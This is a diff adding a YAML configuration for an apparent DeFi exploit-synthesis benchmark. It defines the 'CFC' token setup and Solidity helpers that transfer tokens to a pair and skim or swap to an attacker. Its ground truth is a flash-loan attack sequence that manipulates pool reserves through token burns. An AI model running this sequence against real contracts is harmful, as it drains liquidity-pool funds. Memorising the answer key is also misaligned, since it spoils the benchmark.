@@ -1,0 +1,92 @@
+# Information for benchmarks building.
+project_name: "CFC"
+
+ctrt_name2cls:
+  - ["usdt", "USDT"]
+  - ["safe", "SAFE"]
+  - ["cfc", "CFC"]
+  - ["safeusdtPair", "UniswapV2Pair"]
+  - ["CakeLP", "UniswapV2Pair"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+
+ctrt_name2deploy:
+  - ["usdt", "new USDT()"]
+  - ["safe", "new SAFE()"]
+  - ["cfc", "new CFC(address(safe))"]
+  - ["safeusdtPair", ""]
+  - ["CakeLP", ""]
+  - ["factory", ""]
+  - ["router", ""]
+  
+extra_actions: 
+ - "function burn_cfc_CakeLP(uint256 amount) internal eurus {
+    cfc.transfer(address(CakeLP), amount);
+    CakeLP.skim(attacker);
+    amount /= 15;
+    cfc.transfer(address(CakeLP), amount);
+    CakeLP.skim(attacker);
+  }"
+ - "function swap_CakeLP_attacker_cfc_safe(uint256 amount, uint256 amountOut
+    ) internal eurus {
+      cfc.transfer(address(CakeLP), amount);
+      CakeLP.swap(amountOut, 0, attacker, new bytes(0));
+      amountOut /= 3;
+      cfc.transfer(address(CakeLP), amount);
+      CakeLP.swap(amountOut, 0, attacker, new bytes(0));
+    }"
+
+
+extra_deployments:
+  - "cfc.afterDeploy(address(router), address(CakeLP));"
+
+extra_statements: []
+
+attack_goal_str: "usdt"
+
+groundtruth:
+  - ["borrow", "usdt", "owner", "57 * 1e22"]
+  - ["swap", "safeusdtPair", "attacker", "usdt", "safe", "13 * 1e21", "safeusdtPair.getAmountOut(13 * 1e21, address(usdt))"]
+  - ["swap", "CakeLP", "attacker", "safe", "cfc", "safe.balanceOf(attacker)", "CakeLP.getAmountOut(safe.balanceOf(attacker), address(safe))"]
+  - ["burn", "cfc", "CakeLP", "cfc.balanceOf(address(attacker)) * 15 /16"]
+  - ["burn", "cfc", "CakeLP", "cfc.balanceOf(address(CakeLP)) - 1"]
+  - ["swap", "CakeLP", "attacker", "cfc", "safe", "cfc.balanceOf(attacker) / 200", "CakeLP.getAmountOut(cfc.balanceOf(attacker) /200, address(cfc))"]
+  - ["swap", "CakeLP", "attacker", "cfc", "safe", "cfc.balanceOf(attacker) / 200", "CakeLP.getAmountOut(cfc.balanceOf(attacker) /200, address(cfc))"]
+  - ["swap", "safeusdtPair", "attacker", "safe", "usdt", "safe.balanceOf(attacker)", "safeusdtPair.getAmountOut(safe.balanceOf(attacker), address(safe))"]
+  - ["payback", "usdt", "owner", "57 * 1e22"]
+
+# Information for search space building.
+roles:
+  "usdt":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "safe":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "cfc":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "safeusdtPair":
+    is_swappair: true
+    is_uniswap: true
+    token_pair: ["safe", "usdt"]
+    support_swaps:
+      "safe": ["safe", "usdt"]
+      "bept": ["safe", "usdt"]
+    is_oracle: true
+    oracle: "pair"
+  "CakeLP":
+    is_swappair: true
+    is_uniswap: true
+    token_pair: ["safe", "cfc"]
+    support_swaps:
+      "safe": ["safe", "cfc"]
+      "cfc": ["safe", "cfc"]
+    is_oracle: true
+    oracle: "pair"
+
+
+pattern: "Token burn"
